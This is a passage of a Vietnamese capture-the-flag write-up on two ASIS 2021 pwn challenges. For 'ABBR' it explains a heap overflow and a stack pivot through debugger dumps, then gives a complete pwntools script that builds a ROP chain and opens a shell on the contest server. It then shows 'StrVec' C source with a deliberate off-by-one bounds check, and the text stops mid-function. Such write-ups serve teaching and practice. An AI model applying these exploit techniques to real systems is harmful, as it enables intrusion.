+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;oob&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;out of bounds&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ret2&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;return to &#34;</span>},
+</span></span><span style="display:flex;"><span>  };
+</span></span></code></pre></div><h2 id="solution-1">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-1">#</a></h2>
+<p>Lúc đầu nhìn sơ qua thì mình không thấy bug, nhưng khi để ý kỹ lại thì ở khi nhập input cho <code>t-text</code> ở <code>[2]</code>, nếu mình nhập 1 lượng lớn abbr thì phần buffer sẽ sẽ bị tràn do mình chỉ có thể thoát được vòng lặp for ở <code>[3]</code> khi gặp null byte, và không có đoạn nào check phần data của buffer có trở nên lớn hơn do các chữ expanded không. Các bạn xem ví dụ dưới đây để dễ hình dung:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./abbr
+</span></span><span style="display:flex;"><span>Enter text: imnsho
+</span></span><span style="display:flex;"><span>Result: in my not so humble opinion
+</span></span><span style="display:flex;"><span>Enter text: imnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnsho
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Với lỗi này thì mình có thể overwrite được <code>t-&gt;translate</code> thành 1 địa chỉ khác. Trong lúc giải đang diễn ra thì mình giải theo hướng overwrite <code>t-&gt;translate</code> thành <code>printf()</code> để thực hiện format string. Leak heap, pivot stack lên heap rồi build rop chain (các bạn tham khảo solve script của mình tại <a href="https://github.com/pivik271/ctf-writeups/blob/main/2021/Asis%20Quals/ABBR/solve/solve_format_string.py">đây</a>). Nhưng cách này khá dài dòng và rắc rối nên mình sẽ trình bày theo intended solution mà mình có tham khảo writeup của tác giả và làm lại sau khi kết thúc giải.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> RAX  0x214cb90 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span> RBX  0x400530 ◂— 0x0
+</span></span><span style="display:flex;"><span>*RCX  0x459e62 <span style="color:#f92672">(</span>read+18<span style="color:#f92672">)</span> ◂— cmp    rax, -0x1000 /* <span style="color:#e6db74">&#39;H=&#39;</span> */
+</span></span><span style="display:flex;"><span>*RDX  0x0
+</span></span><span style="display:flex;"><span>*RDI  0x4cc020 <span style="color:#f92672">(</span>_IO_stdfile_0_lock<span style="color:#f92672">)</span> ◂— 0x0
+</span></span><span style="display:flex;"><span>*RSI  0x4c9943 <span style="color:#f92672">(</span>_IO_2_1_stdin_+131<span style="color:#f92672">)</span> ◂— 0x4cc020000000000a /* <span style="color:#e6db74">&#39;\n&#39;</span> */
+</span></span><span style="display:flex;"><span>*R8   0x214cb90 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span>*R9   0x0
+</span></span><span style="display:flex;"><span> R10  0x49e522 ◂— <span style="color:#e6db74">&#39;Enter text: &#39;</span>
+</span></span><span style="display:flex;"><span> R11  0x246
+</span></span><span style="display:flex;"><span> R12  0x4030e0 <span style="color:#f92672">(</span>__libc_csu_fini<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span> R13  0x0
+</span></span><span style="display:flex;"><span> R14  0x4c9018 <span style="color:#f92672">(</span>_GLOBAL_OFFSET_TABLE_+24<span style="color:#f92672">)</span> —▸ 0x44fd90 <span style="color:#f92672">(</span>__strcpy_avx2<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span> R15  0x0
+</span></span><span style="display:flex;"><span> RBP  0x7ffe20727c60 —▸ 0x403040 <span style="color:#f92672">(</span>__libc_csu_init<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span> RSP  0x7ffe20727c50 ◂— 0x0
+</span></span><span style="display:flex;"><span>*RIP  0x402015 <span style="color:#f92672">(</span>main+157<span style="color:#f92672">)</span> ◂— mov    rax, qword ptr <span style="color:#f92672">[</span>rbp - 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM <span style="color:#f92672">]</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   0x402003 &lt;main+139&gt;    mov    rax, qword ptr <span style="color:#f92672">[</span>rbp - 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x402007 &lt;main+143&gt;    mov    rax, qword ptr <span style="color:#f92672">[</span>rax + 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x40200b &lt;main+147&gt;    mov    esi, ecx
+</span></span><span style="display:flex;"><span>   0x40200d &lt;main+149&gt;    mov    rdi, rax
+</span></span><span style="display:flex;"><span>   0x402010 &lt;main+152&gt;    call   fgets                      &lt;fgets&gt;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> ► 0x402015 &lt;main+157&gt;    mov    rax, qword ptr <span style="color:#f92672">[</span>rbp - 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x402019 &lt;main+161&gt;    mov    rax, qword ptr <span style="color:#f92672">[</span>rax + 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x40201d &lt;main+165&gt;    movzx  eax, byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x402020 &lt;main+168&gt;    cmp    al, 0xa
+</span></span><span style="display:flex;"><span>   0x402022 &lt;main+170&gt;    je     main+222                      &lt;main+222&gt;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   0x402024 &lt;main+172&gt;    mov    rax, qword ptr <span style="color:#f92672">[</span>rbp - 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> STACK <span style="color:#f92672">]</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>00:0000│ rsp 0x7ffe20727c50 ◂— 0x0
+</span></span><span style="display:flex;"><span>01:0008│     0x7ffe20727c58 —▸ 0x214dba0 —▸ 0x405121 <span style="color:#f92672">(</span>_nl_load_domain+737<span style="color:#f92672">)</span> ◂— xchg   eax, esp
+</span></span><span style="display:flex;"><span>02:0010│ rbp 0x7ffe20727c60 —▸ 0x403040 <span style="color:#f92672">(</span>__libc_csu_init<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span>03:0018│     0x7ffe20727c68 —▸ 0x402870 <span style="color:#f92672">(</span>__libc_start_main+1168<span style="color:#f92672">)</span> ◂— mov    edi, eax
+</span></span><span style="display:flex;"><span>04:0020│     0x7ffe20727c70 ◂— 0x0
+</span></span><span style="display:flex;"><span>05:0028│     0x7ffe20727c78 ◂— 0x100000000
+</span></span><span style="display:flex;"><span>06:0030│     0x7ffe20727c80 —▸ 0x7ffe20727d98 —▸ 0x7ffe2072934a ◂— 0x5300726262612f2e /* <span style="color:#e6db74">&#39;./abbr&#39;</span> */
+</span></span><span style="display:flex;"><span>07:0038│     0x7ffe20727c88 —▸ 0x401f78 <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> BACKTRACE <span style="color:#f92672">]</span>───────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span> ► f <span style="color:#ae81ff">0</span>         0x402015 main+157
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">1</span>         0x402870 __libc_start_main+1168
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>pwndbg&gt;
+</span></span></code></pre></div><p>Có 2 thanh ghi chứa địa chỉ của buffer là <code>rax</code> và <code>r8</code>, vậy mình chỉ cần tìm gadget nào liên quan tới 1 trong 2 thanh ghi này và <code>esp</code>. Trong binary có 1 gadget như vậy là <code>xchg eax, esp ; ret</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*RAX  0x20727c48
+</span></span><span style="display:flex;"><span> RBX  0x400530 ◂— 0x0
+</span></span><span style="display:flex;"><span> RCX  0x459e62 <span style="color:#f92672">(</span>read+18<span style="color:#f92672">)</span> ◂— cmp    rax, -0x1000 /* <span style="color:#e6db74">&#39;H=&#39;</span> */
+</span></span><span style="display:flex;"><span> RDX  0x405121 <span style="color:#f92672">(</span>_nl_load_domain+737<span style="color:#f92672">)</span> ◂— xchg   eax, esp
+</span></span><span style="display:flex;"><span> RDI  0x214cb90 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span> RSI  0x4c9943 <span style="color:#f92672">(</span>_IO_2_1_stdin_+131<span style="color:#f92672">)</span> ◂— 0x4cc020000000000a /* <span style="color:#e6db74">&#39;\n&#39;</span> */
+</span></span><span style="display:flex;"><span> R8   0x214cb90 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span> R9   0x0
+</span></span><span style="display:flex;"><span> R10  0x49e522 ◂— <span style="color:#e6db74">&#39;Enter text: &#39;</span>
+</span></span><span style="display:flex;"><span> R11  0x246
+</span></span><span style="display:flex;"><span> R12  0x4030e0 <span style="color:#f92672">(</span>__libc_csu_fini<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span> R13  0x0
+</span></span><span style="display:flex;"><span> R14  0x4c9018 <span style="color:#f92672">(</span>_GLOBAL_OFFSET_TABLE_+24<span style="color:#f92672">)</span> —▸ 0x44fd90 <span style="color:#f92672">(</span>__strcpy_avx2<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span> R15  0x0
+</span></span><span style="display:flex;"><span> RBP  0x7ffe20727c60 —▸ 0x403040 <span style="color:#f92672">(</span>__libc_csu_init<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span>*RSP  0x214cb90 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span>*RIP  0x405122 <span style="color:#f92672">(</span>_nl_load_domain+738<span style="color:#f92672">)</span> ◂— ret    
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM <span style="color:#f92672">]</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   0x405121 &lt;_nl_load_domain+737&gt;    xchg   eax, esp
+</span></span><span style="display:flex;"><span> ► 0x405122 &lt;_nl_load_domain+738&gt;    ret    &lt;0x6161616161616161&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> STACK <span style="color:#f92672">]</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>00:0000│ rdi r8 rsp 0x214cb90 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span>01:0008│            0x214cb98 ◂— <span style="color:#e6db74">&#39;bbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span>02:0010│            0x214cba0 ◂— 0xa /* <span style="color:#e6db74">&#39;\n&#39;</span> */
+</span></span><span style="display:flex;"><span>03:0018│            0x214cba8 ◂— 0x0
+</span></span><span style="display:flex;"><span>... ↓               <span style="color:#ae81ff">4</span> skipped
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> BACKTRACE <span style="color:#f92672">]</span>───────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span> ► f <span style="color:#ae81ff">0</span>         0x405122 _nl_load_domain+738
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">1</span> 0x6161616161616161
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">2</span> 0x6262626262626262
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">3</span>              0xa
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">4</span>              0x0
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>pwndbg&gt;
+</span></span></code></pre></div><p>Gadget đó sẽ swap eax và esp, do đó sẽ pivot được stack lên heap. Sau đó ta chỉ việc rop until it pops a shell :&gt;</p>
+<h2 id="final-script-1">Final script<a hidden class="anchor" aria-hidden="true" href="#final-script-1">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./abbr&#39;)</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;168.119.108.148&#39;</span>, <span style="color:#ae81ff">10010</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4018da</span>
+</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404cfe</span>
+</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4017df</span>
+</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x45a8f7</span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4012e3</span>
+</span></span><span style="display:flex;"><span>mov <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x48a425</span>						<span style="color:#75715e"># mov qword ptr [rsi], rax ; ret</span>
+</span></span><span style="display:flex;"><span>data_seg <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004c91e0</span>
+</span></span><span style="display:flex;"><span>xchg_eax_esp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x405121</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;imnsho&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">150</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(xchg_eax_esp)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;text: &#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(pop_rsi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data_seg)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(mov)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data_seg)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x3b</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;text: &#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 168.119.108.148 on port 10010: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>chall
+</span></span><span style="display:flex;"><span>flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
+</span></span><span style="display:flex;"><span>$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
+</span></span><span style="display:flex;"><span>ASIS<span style="color:#f92672">{</span>d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="strvec">StrVec:<a hidden class="anchor" aria-hidden="true" href="#strvec">#</a></h1>
+<ul>
+<li>Category: pwn</li>
+<li>Points: 114</li>
+<li>Solves: 38</li>
+<li>Description: How to implement secure array in C? Is it easy, right?</li>
+</ul>
+<h2 id="source-code-overview-2">Source code overview<a hidden class="anchor" aria-hidden="true" href="#source-code-overview-2">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> size;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>elements[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>} vector;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readline</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">int</span> length) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;%s&#34;</span>, msg);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> length<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf[i], <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> buf[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  buf[i] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">readint</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  readline(msg, buf, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> atoi(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vector <span style="color:#f92672">*</span><span style="color:#a6e22e">vector_new</span>(<span style="color:#66d9ef">int</span> nmemb) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (nmemb <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(vector) <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>) <span style="color:#f92672">*</span> nmemb;
+</span></span><span style="display:flex;"><span>  vector <span style="color:#f92672">*</span>vec <span style="color:#f92672">=</span> (vector<span style="color:#f92672">*</span>)malloc(size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>vec)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  memset(vec, <span style="color:#ae81ff">0</span>, size);
+</span></span><span style="display:flex;"><span>  vec<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> nmemb;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> vec;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vector_delete</span>(vector <span style="color:#f92672">*</span>vec) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> vec<span style="color:#f92672">-&gt;</span>size; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    free(vec<span style="color:#f92672">-&gt;</span>elements[i]);
+</span></span><span style="display:flex;"><span>  free(vec);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">vector_get</span>(vector <span style="color:#f92672">*</span>vec, <span style="color:#66d9ef">int</span> idx) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> vec<span style="color:#f92672">-&gt;</span>size)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> vec<span style="color:#f92672">-&gt;</span>elements[idx];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vector_set</span>(vector <span style="color:#f92672">*</span>vec, <span style="color:#66d9ef">int</span> idx, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> vec<span style="color:#f92672">-&gt;</span>size)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (vec<span style="color:#f92672">-&gt;</span>elements[idx])
+</span></span><span style="display:flex;"><span>    free(vec<span style="color:#f92672">-&gt;</span>elements[idx]);
+</span></span><span style="display:flex;"><span>  vec<span style="color:#f92672">-&gt;</span>elements[idx] <span style="color:#f92672">=</span> ptr;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x10</span>];
+</span></span><span style="display:flex;"><span>  readline(<span style="color:#e6db74">&#34;Name: &#34;</span>, name, <span style="color:#66d9ef">sizeof</span>(name));
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Hello, %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+</span></span><span style="display:flex;"><span>
